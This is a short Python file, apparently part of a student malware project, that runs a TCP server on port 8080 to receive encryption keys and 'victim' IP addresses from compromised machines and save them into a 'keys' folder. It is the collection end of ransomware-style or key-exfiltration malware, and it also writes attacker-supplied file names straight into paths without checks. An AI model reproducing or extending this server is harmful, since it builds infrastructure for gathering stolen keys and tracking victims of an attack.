import socket
import os

with open("/home/tfg/server/server_ip.txt", "r") as f:
        IP = f.read()

PORT = 8080
ADDR = (IP, PORT)

def server():
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind(ADDR)
        server.listen()

        conn, addr = server.accept()
        
        filename = conn.recv(1024).decode()
        path = os.path.join("/home/tfg/server/Fase3/keys", filename)
        with open(path, "wb") as f:
                data = conn.recv(1024)
                f.write(data)
        
        victim_file_name =  conn.recv(1024).decode()
        path_victim_ip = os.path.join("/home/tfg/server/Fase3", victim_file_name)
        with open(path_victim_ip, "w") as f:
                victim_ip = conn.recv(1024)
                f.write(victim_ip.decode())


        conn.close()

if __name__ == '__main__':
        server()
